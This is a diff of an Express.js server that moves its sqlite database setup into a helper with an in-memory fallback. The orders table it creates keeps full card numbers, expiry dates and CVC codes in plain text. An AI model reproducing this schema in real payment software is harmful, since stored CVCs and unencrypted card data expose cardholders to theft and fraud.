@@ -8,40 +8,69 @@ const fs = require('fs');
 const puppeteer = require('puppeteer');
 const app = express();
 
-// Create data directory if it doesn't exist
-const dataDir = process.env.NODE_ENV === 'production' ? '/data' : './data';
-if (!fs.existsSync(dataDir)) {
-    fs.mkdirSync(dataDir);
+// Database configuration
+let db;
+try {
+    // Try to connect to the database
+    const dbPath = process.env.NODE_ENV === 'production' 
+        ? '/data/store.db'
+        : './data/store.db';
+    
+    db = new sqlite3.Database(dbPath, sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
+        if (err) {
+            console.error('Error opening database:', err);
+            // If production fails, fall back to memory database
+            if (process.env.NODE_ENV === 'production') {
+                console.log('Falling back to in-memory database');
+                db = new sqlite3.Database(':memory:', (err) => {
+                    if (err) {
+                        console.error('Error creating in-memory database:', err);
+                    } else {
+                        initializeDatabase(db);
+                    }
+                });
+            }
+        } else {
+            console.log('Connected to database at:', dbPath);
+            initializeDatabase(db);
+        }
+    });
+} catch (error) {
+    console.error('Database initialization error:', error);
+    // Fall back to in-memory database
+    db = new sqlite3.Database(':memory:', (err) => {
+        if (err) {
+            console.error('Error creating in-memory database:', err);
+        } else {
+            initializeDatabase(db);
+        }
+    });
 }
 
-// Update database path
-const dbPath = path.join(dataDir, 'store.db');
-
-// Initialize database
-const db = new sqlite3.Database(dbPath, (err) => {
-    if (err) {
-        console.error('Error opening database:', err);
-    } else {
-        console.log('Connected to database');
-        // Create tables if they don't exist
-        db.run(`CREATE TABLE IF NOT EXISTS orders (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            email TEXT,
-            cardNumber TEXT,
-            cardExpiry TEXT,
-            cvc TEXT,
-            productName TEXT,
-            productPrice REAL,
-            billing1 TEXT,
-            billing2 TEXT,
-            billing3 TEXT,
-            billing4 TEXT,
-            billing5 TEXT,
-            date DATETIME DEFAULT CURRENT_TIMESTAMP,
-            status TEXT DEFAULT 'pending'
-        )`);
-    }
-});
+function initializeDatabase(database) {
+    database.run(`CREATE TABLE IF NOT EXISTS orders (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        email TEXT,
+        cardNumber TEXT,
+        cardExpiry TEXT,
+        cvc TEXT,
+        productName TEXT,
+        productPrice REAL,
+        billing1 TEXT,
+        billing2 TEXT,
+        billing3 TEXT,
+        billing4 TEXT,
+        billing5 TEXT,
+        date DATETIME DEFAULT CURRENT_TIMESTAMP,
+        status TEXT DEFAULT 'pending'
+    )`, (err) => {
+        if (err) {
+            console.error('Error creating table:', err);
+        } else {
+            console.log('Database initialized successfully');
+        }
+    });
+}
 
 // Add EJS as template engine
 app.set('view engine', 'ejs');
@@ -64,7 +93,7 @@ const sessionConfig = {
 };
 
 if (process.env.NODE_ENV === 'production') {
-    app.set('trust proxy', 1); // trust first proxy
+    app.set('trust proxy', 1);
 }
 
 app.use(session(sessionConfig));
